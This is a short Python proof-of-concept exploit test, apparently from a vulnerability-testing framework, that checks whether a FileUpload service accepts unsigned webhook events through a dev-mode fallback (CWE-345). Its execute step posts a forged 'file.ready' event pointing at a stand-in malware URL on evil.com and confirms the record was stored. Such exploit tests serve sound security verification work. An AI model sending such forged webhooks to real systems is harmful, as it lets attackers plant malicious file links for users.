"""PoC: Webhook signature bypass via dev-mode fallback on FileUpload (CWE-345)."""

from mosaic.oracle.exploit import ExploitTest


class FileUploadWebhookBypassExploit(ExploitTest):
    """Webhook bypass: forge CDN events without signature."""

    @property
    def chain_id(self) -> str:
        return "fileupload_webhook_bypass"

    def setup(self) -> None:
        resp = self.http_get("/")
        if resp.status_code not in (200, 302, 404):
            raise ConnectionError(f"Server not reachable: {resp.status_code}")

    def execute(self) -> tuple[bool, str]:
        # Send a forged file.ready event without signature
        forged_event = {
            "type": "file.ready",
            "data": {
                "file_id": "file_exploit_001",
                "cdn_url": "https://evil.com/malware.exe",
            },
        }

        resp = self.http_post(
            "/webhook",
            json=forged_event,
            headers={"Content-Type": "application/json"},
        )

        if resp.ok:
            # Verify the file record was created
            verify = self.http_get("/files/file_exploit_001")
            if verify.ok:
                try:
                    data = verify.json()
                    if data.get("cdn_url") == "https://evil.com/malware.exe":
                        return True, (
                            f"CWE-345 confirmed. Forged file.ready event accepted "
                            f"without signature (HTTP {resp.status_code}). "
                            f"File record created with attacker-controlled CDN URL. "
                            f"Attacker can inject malicious file references."
                        )
                except Exception:
                    pass

            return True, (
                f"Forged webhook event accepted without signature "
                f"(HTTP {resp.status_code}). Response: {resp.text[:200]}"
            )

        if resp.status_code == 400:
            return False, (
                f"Signature verification active (HTTP 400). "
                f"Dev-mode fallback not triggered. {resp.text[:200]}"
            )

        return False, f"Unexpected: HTTP {resp.status_code}: {resp.text[:200]}"
